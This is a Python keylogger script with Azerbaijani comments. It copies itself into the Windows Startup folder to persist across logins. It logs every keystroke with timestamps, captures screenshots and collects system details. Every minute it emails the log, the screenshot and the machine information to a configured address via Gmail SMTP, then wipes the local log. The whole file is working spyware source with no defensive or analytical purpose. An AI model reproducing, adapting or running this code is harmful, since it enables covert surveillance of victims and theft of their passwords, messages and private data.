import pyautogui                                               
import smtplib                                                 
from email.mime.text import MIMEText                           
from email.mime.image import MIMEImage                         
from email.mime.multipart import MIMEMultipart
import platform                                                
from pynput.keyboard import Listener                          
import datetime
import threading
import getpass                                                
import shutil                                                  

#keylog and screenshot folder path
p = "C://Users/"+str(getpass.getuser())+"/SysInfo/"

#add keylog.py file to Windows Startup folder 
try:
    shutil.move("keylog.py" ,"c://users/"+str(getpass.getuser())+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/keylog.py")
except FileNotFoundError:
    pass

#Keylogger mail text
txt = """Bu e-mail keylogger terefinden gonderilmishdir
Sistem:{}\nEmeliyyat Sistemi:{}\nKomputerin adi:{}
\nProsessor:{}"""

a = datetime.datetime.today()

#Screenshot file path
img = p+ "a1.png"

#sending keys to keylog file
def on_press1(key):
    print(key)
    s = datetime.datetime.today()
    u = str(s.year)+"-"+str(s.month)+"-"+str(s.day)+"  "+str(s.hour)+":"+str(s.minute)+":"+str(s.second) #key press time
    with open(p+"p.txt" , "a") as f:
        f.write(str(u)+" => "+str(key)+"\n")

#Listening to the keyboard :)
def listen():
    with Listener(on_press = on_press1) as listener:
        listener.join()
try:
#Sending Mail
    def SendMail(img):
        global a
        while True:
            pyautogui.screenshot(img)               #taking screenshot
            b = datetime.datetime.today()-a
            if b.seconds >60:                       #delay time between sended mails
                img_data = open(img, 'rb').read()   #reading screenshot image
                msg = MIMEMultipart()
                msg['Subject'] = 'Keylogger 1.0'
                msg['From'] = 'Gonderen E-mail'
                msg['To'] = 'Alacaq E-mail'
                with open(p+"p.txt" , "r") as d:
                    g1 = d.read()
                g1 = MIMEText(g1)
                text = MIMEText(str(txt).format(platform.system(),platform.platform(),platform.uname()[1],platform.uname()[5])) #Adding machhine information
                msg.attach(text)                     
                msg.attach(g1)
                image = MIMEImage(img_data)
                msg.attach(image)
                s = smtplib.SMTP("smtp.gmail.com", "587") #GMAIL.COM SMTP settings
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login("Gonderen E-mail", "Parol")       #Gmail username and password
                s.sendmail("Gonderen E-mail", "Alacaq E-mail", msg.as_string()) #SendFrom,SendTo,Message
                print("Gonderildi")
                with open(p+"p.txt" , "w") as d2:               #removing log file content
                    d2.write("")                                #removing log file content
                a = datetime.datetime.today()
except:
    pass

t1 = threading.Thread(target = listen)                          #Threading
t2 = threading.Thread(target = SendMail , args=(img,))          #Threading

t1.start()
t2.start()

t1.join()
t2.join()
